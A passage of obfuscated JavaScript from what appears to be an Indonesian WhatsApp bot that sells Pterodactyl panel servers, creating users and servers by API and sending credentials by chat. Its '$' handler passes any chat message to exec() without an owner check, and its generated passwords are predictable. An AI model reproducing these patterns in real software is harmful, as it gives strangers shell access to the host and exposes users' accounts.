              'first_name': _0x382e33,
              'last_name': _0x382e33,
              'language': 'en',
              'password': _0x46bdc4
            })
          });
          let _0x4d555e = await _0x4c623f.json();
          if (_0x4d555e.errors) {
            return _0x2d94c9(JSON.stringify(_0x4d555e.errors[0x0], null, 0x2));
          }
          let _0xf6f45b = _0x4d555e.attributes;
          let _0x4fbea2 = await fetch(domain + '/api/application/nests/5/eggs/' + _0x18e85f, {
            'method': "GET",
            'headers': {
              'Accept': 'application/json',
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x2d94c9("SUCCES CREATE USER ID: " + _0xf6f45b.id);
          ctf = "Hai @" + _0x4ceb34.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0xf6f45b.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x46bdc4 + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x488b14.sendMessage(_0x4ceb34, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x488b14.chat
          });
          let _0x3e5228 = await _0x4fbea2.json();
          let _0x595728 = _0x3e5228.attributes.startup;
          let _0x424745 = await fetch(domain + '/api/application/servers', {
            'method': 'POST',
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0xfefc95,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0xf6f45b.id,
              'egg': parseInt(_0x18e85f),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x595728,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "13240",
                'swap': 0x0,
                'disk': "13240",
                'io': 0x1f4,
                'cpu': "230"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x3b42d6)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x48cf3f = await _0x424745.json();
          if (_0x48cf3f.errors) {
            return _0x2d94c9(JSON.stringify(_0x48cf3f.errors[0x0], null, 0x2));
          }
        }
        break;
      case "12gb":
        {
          if (!_0x55dc4 && !_0x14f0d6) {
            return _0x2d94c9(mess.only.premium);
          }
          let _0x30dab2 = _0x5592c0.split(',');
          if (_0x30dab2.length < 0x2) {
            return _0x2d94c9("*Format salah!*\nPenggunaan:\n" + (_0x28d847 + _0x1a8c03) + " user,nomer");
          }
          let _0x1eaec6 = _0x30dab2[0x0];
          let _0x50242c = _0x257ec2.quoted ? _0x257ec2.quoted.sender : _0x30dab2[0x1] ? _0x30dab2[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x257ec2.mentionedJid[0x0];
          let _0x1a1735 = _0x1eaec6 + "12GB";
          let _0x184bd6 = global.eggsnya;
          let _0x295a2a = global.location;
          let _0x5cde76 = _0x1eaec6 + "1398@gmail.com";
          akunlo = 'https://telegra.ph/file/3d91b41617cb982acf0c4.jpg';
          if (!_0x50242c) {
            return;
          }
          let _0x269f74 = _0x1eaec6 + "0011";
          let _0x6c3c0b = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x5cde76,
              'username': _0x1eaec6,
              'first_name': _0x1eaec6,
              'last_name': _0x1eaec6,
              'language': 'en',
              'password': _0x269f74
            })
          });
          let _0xfad517 = await _0x6c3c0b.json();
          if (_0xfad517.errors) {
            return _0x2d94c9(JSON.stringify(_0xfad517.errors[0x0], null, 0x2));
          }
          let _0xead5ce = _0xfad517.attributes;
          let _0x46c967 = await fetch(domain + '/api/application/nests/5/eggs/' + _0x184bd6, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x2d94c9("SUCCES CREATE USER ID: " + _0xead5ce.id);
          ctf = "Hai @" + _0x50242c.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0xead5ce.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x269f74 + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x488b14.sendMessage(_0x50242c, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x488b14.chat
          });
          let _0x2fe7bb = await _0x46c967.json();
          let _0x3f5c6f = _0x2fe7bb.attributes.startup;
          let _0x5a92ac = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x1a1735,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0xead5ce.id,
              'egg': parseInt(_0x184bd6),
              'docker_image': 'ghcr.io/parkervcp/yolks:nodejs_18',
              'startup': _0x3f5c6f,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "12240",
                'swap': 0x0,
                'disk': "12240",
                'io': 0x1f4,
                'cpu': "310"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x295a2a)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x4a576e = await _0x5a92ac.json();
          if (_0x4a576e.errors) {
            return _0x2d94c9(JSON.stringify(_0x4a576e.errors[0x0], null, 0x2));
          }
        }
        break;
      case '11gb':
        {
          if (!_0x55dc4 && !_0x14f0d6) {
            return _0x2d94c9(mess.only.premium);
          }
          let _0x3e774c = _0x5592c0.split(',');
          if (_0x3e774c.length < 0x2) {
            return _0x2d94c9("*Format salah!*\nPenggunaan:\n" + (_0x28d847 + _0x1a8c03) + " user,nomer");
          }
          let _0x579975 = _0x3e774c[0x0];
          let _0x23a5b1 = _0x257ec2.quoted ? _0x257ec2.quoted.sender : _0x3e774c[0x1] ? _0x3e774c[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x257ec2.mentionedJid[0x0];
          let _0x7906b0 = _0x579975 + "11GB";
          let _0x59e340 = global.eggsnya;
          let _0xdd05f1 = global.location;
          let _0x221c80 = _0x579975 + "1398@gmail.com";
          akunlo = 'https://telegra.ph/file/3d91b41617cb982acf0c4.jpg';
          if (!_0x23a5b1) {
            return;
          }
          let _0x10a816 = _0x579975 + "0011";
          let _0x19c406 = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': 'application/json',
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x221c80,
              'username': _0x579975,
              'first_name': _0x579975,
              'last_name': _0x579975,
              'language': 'en',
              'password': _0x10a816
            })
          });
          let _0x5e4b8c = await _0x19c406.json();
          if (_0x5e4b8c.errors) {
            return _0x2d94c9(JSON.stringify(_0x5e4b8c.errors[0x0], null, 0x2));
          }
          let _0x12cc06 = _0x5e4b8c.attributes;
          let _0x2c2a61 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x59e340, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': 'application/json',
              'Authorization': "Bearer " + apikey
            }
          });
          _0x2d94c9("SUCCES CREATE USER ID: " + _0x12cc06.id);
          ctf = "Hai @" + _0x23a5b1.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x12cc06.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x10a816 + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x488b14.sendMessage(_0x23a5b1, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x488b14.chat
          });
          let _0x155520 = await _0x2c2a61.json();
          let _0x40162b = _0x155520.attributes.startup;
          let _0x3f4b54 = await fetch(domain + '/api/application/servers', {
            'method': 'POST',
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x7906b0,
              'description': "PANEL BY ⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x12cc06.id,
              'egg': parseInt(_0x59e340),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x40162b,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "11240",
                'swap': 0x0,
                'disk': "11240",
                'io': 0x1f4,
                'cpu': "280"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0xdd05f1)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x58e2a7 = await _0x3f4b54.json();
          if (_0x58e2a7.errors) {
            return _0x2d94c9(JSON.stringify(_0x58e2a7.errors[0x0], null, 0x2));
          }
        }
        break;
      case "totalfitur":
        {
          ngaceng = fs.readFileSync("./rabyyx.js").toString();
          matches = ngaceng.match(/case '[^']+'(?!.*case '[^']+')/g) || [];
          caseCount = matches.length;
          caseNames = matches.map(_0x343505 => _0x343505.match(/case '([^']+)'/)[0x1]);
          _0x2d94c9(" *Haii " + _0x2b0ab7 + "*\n\n𝐓𝐨𝐭𝐚𝐥 𝐅𝐢𝐭𝐮𝐫 : *" + _0x1d4a0c() + " Fitur*");
        }
        break;
      default:
    }
    if (_0xf97983.startsWith('$')) {
      exec(_0xf97983.slice(0x2), (_0x2d1b21, _0x5929ab) => {
        if (_0x2d1b21) {
          return _0x2d94c9(_0x2d1b21);
        }
        if (_0x5929ab) {
          return _0x2d94c9(_0x5929ab);
        }
      });
    }
    if (_0xf97983.startsWith('>')) {
      if (!_0x14f0d6) {
        return _0x2d94c9(mess.only.owner);
      }
      try {
        let _0x3160fe = await eval(_0xf97983.slice(0x2));
        if (typeof _0x3160fe !== "string") {
          _0x3160fe = require('util').inspect(_0x3160fe);
        }
        await _0x2d94c9(_0x3160fe);
      } catch (_0x4981c3) {
        _0x2d94c9(String(_0x4981c3));
      }
    }
  } catch (_0x242b50) {
    console.log(_0x242b50);
    _0x488b14.sendMessage(owner + '@s.whatsapp.net', {
      'text': '' + util.format(_0x242b50)
    });
  }
};
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(chalk.redBright("Update " + __filename));
  delete require.cache[file];
  require(file);
});
